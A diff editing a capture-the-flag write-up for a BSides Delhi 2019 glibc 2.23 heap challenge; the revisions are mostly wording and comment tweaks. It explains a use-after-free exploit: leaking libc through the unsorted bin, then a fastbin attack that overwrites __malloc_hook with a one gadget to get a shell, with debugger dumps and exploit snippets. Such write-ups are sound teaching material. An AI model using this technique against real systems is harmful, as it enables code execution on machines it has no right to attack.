@@ -6,7 +6,9 @@ categories: pwn
 tags: BSides-Delhi-2019
 ---
 
-This is a glibc 2.23 heap exploitation challenge. There is a UAF (use-after-free) vulnerability in the program. When chunks are freed, their corresponding pointers in the global array of chunks is not NULL'd out.
+BSides Delhi 2019 turned up with some amazing pwn challenges this year. I was only able to solve this one, but big props to the organizers and challenge authors for an amazing CTF!
+
+This is a glibc 2.23 heap exploitation challenge. There is a UAF (use-after-free) vulnerability in the program. When messages are deleted, their corresponding pointers in the global array of messages are not NULL'd out.
 
 I initially use the unsorted bin to leak the libc address of the unsorted bin in the main arena. I use this address to find the base address of libc, followed by the address of `__malloc_hook` as well as the address of my one gadget. After that, it's essentially just a fastbin attack to get a chunk on top of `__malloc_hook` and overwrite it with the one gadget's address.
 
@@ -15,8 +17,8 @@ Honestly, the UAF makes this challenge extremely easy. I'm surprised more people
 ### **Challenge**
 
 * **Category:** pwn
-* **Points:** 957
-* **Solves:** 12
+* **Points:** 919
+* **Solves:** 16
 
 >Discription: Here comes a new and improved free message saving service.
 >
@@ -62,7 +64,7 @@ gef➤  x/100gx 0x0000555555559000
 0x555555559080: 0x0000000000000000      0x0000000000000000
 ```
 
-The `edit` function will just edit a message's topic and body. No heap overflows or anything here, so it's a pretty uninteresting function.
+The `edit` function will just edit a message's topic and body (in that order). No heap overflows or anything here, so it's a pretty uninteresting function.
 
 The `delete` function will free a message's topic and body, but it will not `NULL` out the message's pointer that is stored in the global `messages` array. This creates a UAF situation which we will use in the exploit.
 
@@ -72,7 +74,7 @@ The `view` function simply prints out a message's topic followed by its body.
 
 An info leak is extremely easy in glibc 2.23 (due to the absence of the tcache) with a UAF vulnerability. All we have to do is free a small sized chunk and read its FD pointer.
 
-I initially start out by setting up 4 chunks (note that the topic does not matter, you can set it to anything):
+I initially start out by setting up 4 messages (note that the topic does not matter, only the body's size matters):
 1. **Chunk A (size 0x80 bytes)** will be our small sized chunk. It will be used to leak the libc address of the unsorted bin in the main arena.
 2. **Chunk B (size 0x68 bytes)** will be used for the fastbin attack. It must be this size to bypass a check that is described below.
 3. **Chunk C (size 0x68 bytes)** will be used for the fastbin attack. It must be this size to bypass a check that is described below.
@@ -85,7 +87,7 @@ gef➤  x/100gx 0x0000560b07fb2000
 0x560b07fb2010: 0x0000000000000000      0x0000000000000000 <- topic is fastbin sized, so FD is empty after free
 0x560b07fb2020: 0x0000000000000000      0x0000560b07fb2040 <- pointer to body
 0x560b07fb2030: 0x0000000000000082      0x0000000000000091 <- chunk A body
-0x560b07fb2040: 0x00007f150ec23b78      0x00007f150ec23b78 <- FD and BK have libc pointers in them
+0x560b07fb2040: 0x00007f150ec23b78      0x00007f150ec23b78 <- body FD and BK have libc pointers in them
 0x560b07fb2050: 0x4141414141414141      0x4141414141414141 <- rest of chunk A body
 0x560b07fb2060: 0x4141414141414141      0x4141414141414141
 ...
@@ -104,21 +106,21 @@ When fastbin sized chunks are freed, they get stored in a singly stored linked l
 ```c
 gef➤  x/300gx 0x00005564e50e9000
 0x5564e50e9000: 0x0000000000000000      0x0000000000000031 <- chunk A topic (free)
-0x5564e50e9010: 0x0000000000000000      0x0000000000000000 <- chunk A fd is empty as it is the first free chunk
+0x5564e50e9010: 0x0000000000000000      0x0000000000000000 <- chunk A fd is empty as it is the first free chunk in the 0x28 fastbin
 0x5564e50e9020: 0x0000000000000000      0x00005564e50e9040 <- pointer to chunk A body
 0x5564e50e9030: 0x0000000000000082      0x0000000000000091 <- chunk A body (free) in the unsorted bin
 0x5564e50e9040: 0x00007f998eadfb78      0x00007f998eadfb78 <- libc pointers
 0x5564e50e9050: 0x4141414141414141      0x4141414141414141
 ...
 0x5564e50e90c0: 0x0000000000000090      0x0000000000000030 <- chunk B topic (free)
-0x5564e50e90d0: 0x00005564e50e9000      0x0000000000000000 <- chunk B fd points to chunk A topic
+0x5564e50e90d0: 0x00005564e50e9000      0x0000000000000000 <- chunk B fd points to chunk A topic in the 0x28 fastbin
 0x5564e50e90e0: 0x0000000000000000      0x00005564e50e9100 <- pointer to chunk B body
 0x5564e50e90f0: 0x0000000000000068      0x0000000000000071 <- chunk B body
 0x5564e50e9100: 0x0000000000000000      0x4242424242424242 <- chunk B body fd is empty as it is the first free chunk in the 0x68 fastbin
 0x5564e50e9110: 0x4242424242424242      0x4242424242424242
 ...
 0x5564e50e9160: 0x0000424242424242      0x0000000000000031 <- chunk C topic (free)
-0x5564e50e9170: 0x00005564e50e90c0      0x0000000000000000 <- chunk C fd points to chunk B topic
+0x5564e50e9170: 0x00005564e50e90c0      0x0000000000000000 <- chunk C fd points to chunk B topic in the 0x28 fastbin
 0x5564e50e9180: 0x0000000000000000      0x00005564e50e91a0 <- pointer to chunk C body
 0x5564e50e9190: 0x0000000000000068      0x0000000000000071 <- chunk C body
 0x5564e50e91a0: 0x00005564e50e90f0      0x4343434343434343 <- chunk C body fd points to chunk B body in the 0x68 fastbin
@@ -147,7 +149,7 @@ errout:
 
 Basically, the pointer that we overwrite `fd` with must point to a memory region that "looks" like a chunk with a size that will fit in this specific fastbin. Otherwise, we will get the `"malloc(): memory corruption (fast)"` error.
 
-To elaborate, the pointer must point to a memory region that looks like this (using chunk C's body as an example), where the chunk size must be between 0x70 - 0x7f:
+To elaborate, the pointer must point to a memory region that looks like a chunk where the chunk size must be between 0x70 - 0x7f. Chunk C is a good example:
 ```c
 0x5564e50e9190: 0x0000000000000068      0x0000000000000071 <- chunk C body chunksize
 ```
@@ -155,18 +157,18 @@ To elaborate, the pointer must point to a memory region that looks like this (us
 If we take a look at `__malloc_hook` in memory, we will see the following:
 ```c
 gef➤  x/20gx 0x7f6c4122aae0
-0x7f6c4122aae0 <_IO_wide_data_0+288>:   0x0000000000000000      0x0000000000000000
-0x7f6c4122aaf0 <_IO_wide_data_0+304>:   0x00007f6c41229260      0x0000000000000000
-0x7f6c4122ab00 <__memalign_hook>:       0x00007f6c40eebe20      0x00007f6c40eeba00
-0x7f6c4122ab10 <__malloc_hook>: 0x0000000000000000      0x0000000000000000
-0x7f6c4122ab20 <main_arena>:    0x0000000000000000      0x0000000000000000
+0x7f6c4122aae0 <_IO_wide_data_0+288>:   0x0000000000000000      0x0000000000000000 <- not valid (chunksize 0)
+0x7f6c4122aaf0 <_IO_wide_data_0+304>:   0x00007f6c41229260      0x0000000000000000 <- not valid (chunksize 0)
+0x7f6c4122ab00 <__memalign_hook>:       0x00007f6c40eebe20      0x00007f6c40eeba00 <- not valid (0x7f6c49eeba00 is too large!)
+0x7f6c4122ab10 <__malloc_hook>: 0x0000000000000000      0x0000000000000000 <- not valid (chunksize 0)
+0x7f6c4122ab20 <main_arena>:    0x0000000000000000      0x0000000000000000 <- not valid (chunksize 0)
 ...
 ```
 
 We see that there isn't a valid memory region near `__malloc_hook`. However, note that the security check above does not ensure that the memory address is 16 byte aligned, so what happens if we instead view the memory region of `__malloc_hook - 0x30 + 0xd`?
 ```c
 gef➤  x/20gx 0x7f6c4122ab10 - 0x30 + 0xd
-0x7f6c4122aaed <_IO_wide_data_0+301>:   0x6c41229260000000      0x000000000000007f <- looks like a valid chunk!
+0x7f6c4122aaed <_IO_wide_data_0+301>:   0x6c41229260000000      0x000000000000007f <- looks like a valid chunk! (chunksize 0x7f)
 0x7f6c4122aafd: 0x0000000000000000      0x6c40eeba00000000
 0x7f6c4122ab0d <__realloc_hook+5>:      0x000000000000007f      0x0000000000000000
 0x7f6c4122ab1d: 0x0000000000000000      0x0000000000000000
@@ -200,7 +202,7 @@ topic_fd = u64(show(2).split('\n')[0].split(' : ')[1].ljust(8, '\x00'))
 edit(2, p64(topic_fd), p64(malloc_hook))
 ```
 
-Now we simply perform two mallocs. The first malloc gives us back chunk C and puts the pointer pointing at `__malloc_hook - 0x30 + 0xd` at the front of the 0x68 fastbin. The second malloc subsequently gives us a chunk right on top of `__malloc_hook - 0x30 + 0xd`. Now we just have to pad our input enough to overwrite `__malloc_hook` with a one gadget, as follows:
+Now we simply perform two mallocs. The first malloc gives us back chunk C and puts the pointer pointing to `__malloc_hook - 0x30 + 0xd` at the front of the 0x68 fastbin. The second malloc subsequently gives us a chunk right on top of `__malloc_hook - 0x30 + 0xd`. Now we just have to pad our input enough to overwrite `__malloc_hook` with a one gadget, as follows:
 ```python
 # Second allocation will be at __malloc_hook-0x30+0xd
 # Overwrite __malloc_hook with one_gadget
@@ -228,7 +230,7 @@ p.interactive()
 
 ### **Final Exploit**
 
-Note that for some reason, the exploit isn't 100% reliable. I can't seem to figure out why, but I had to run it a couple times on the shell server before it gave me a shell. At the end of the day though, it works.
+Note that for some reason, the exploit isn't 100% reliable. I can't seem to figure out why, but I had to run it a couple times on the remote server before it gave me a shell. At the end of the day though, it works.
 
 ```python
 #!/usr/bin/env python2
